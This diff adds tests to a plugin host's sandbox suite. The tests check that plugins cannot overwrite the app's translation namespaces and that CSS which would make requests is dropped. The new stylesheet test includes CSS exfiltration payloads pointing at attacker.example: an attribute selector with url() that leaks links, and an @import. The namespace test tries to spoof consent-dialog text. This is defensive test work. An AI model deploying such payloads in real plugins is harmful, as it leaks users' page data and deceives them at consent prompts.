@@ -76,16 +76,71 @@ describe("sandboxed plugins", () => {
     const host = createPluginHost(vi.fn(), translations, () => null, undefined, spawnerFor(worker));
 
     await host.load(boxed({ permissions: ["workspace:read"] }));
-    worker.emit({ type: "register-translations", locale: "fa", namespace: "n", resources: {} });
+    worker.emit({
+      type: "register-translations",
+      locale: "fa",
+      namespace: "com.x.demo",
+      resources: {},
+    });
     worker.emit({ type: "workspace-list", callId: 1 });
 
-    expect(translations).toHaveBeenCalledWith("fa", "n", {});
+    expect(translations).toHaveBeenCalledWith("fa", "com.x.demo", {});
     // workspace:read granted but no workspace open: an error result, not a hang.
     await vi.waitFor(() =>
       expect(worker.posted).toContainEqual(
         expect.objectContaining({ type: "host-result", callId: 1, ok: false }),
       ),
     );
+  });
+
+  it("keeps a plugin out of the app's translation namespaces", async () => {
+    const worker = new FakeWorker();
+    const translations = vi.fn();
+    const errors = vi.spyOn(console, "error").mockImplementation(() => {});
+    const host = createPluginHost(vi.fn(), translations, () => null, undefined, spawnerFor(worker));
+
+    await host.load(boxed());
+    // The consent dialog and the external-link prompt read these bundles, and
+    // a registration overwrites existing keys.
+    for (const namespace of ["plugins", "common", "menu", "ai"]) {
+      worker.emit({
+        type: "register-translations",
+        locale: "en",
+        namespace,
+        resources: { consentFullTrustBody: "Routine update." },
+      });
+    }
+    worker.emit({
+      type: "register-translations",
+      locale: "en",
+      namespace: "com.x.demo.panel",
+      resources: {},
+    });
+
+    expect(translations).toHaveBeenCalledTimes(1);
+    expect(translations).toHaveBeenCalledWith("en", "com.x.demo.panel", {});
+    expect(errors).toHaveBeenCalledTimes(4);
+    errors.mockRestore();
+  });
+
+  it("drops a sandboxed stylesheet that would make requests", async () => {
+    const worker = new FakeWorker();
+    const errors = vi.spyOn(console, "error").mockImplementation(() => {});
+    const host = createPluginHost(vi.fn(), undefined, undefined, undefined, spawnerFor(worker));
+
+    await host.load(boxed());
+    // The worker's fetch is fenced; a selector on an attribute plus url()
+    // would report the page's links and paths to any host.
+    worker.emit({
+      type: "add-styles",
+      css: 'a[href^="https://internal"]{background:url(https://attacker.example/l)}',
+    });
+    worker.emit({ type: "add-styles", css: '@import "https://attacker.example/x.css";' });
+    worker.emit({ type: "add-styles", css: ".x{color:red}" });
+
+    expect(host.styles.list().map((s) => s.css)).toEqual([".x{color:red}"]);
+    expect(errors).toHaveBeenCalledTimes(2);
+    errors.mockRestore();
   });
 
   it("propagates activation errors and loads nothing", async () => {
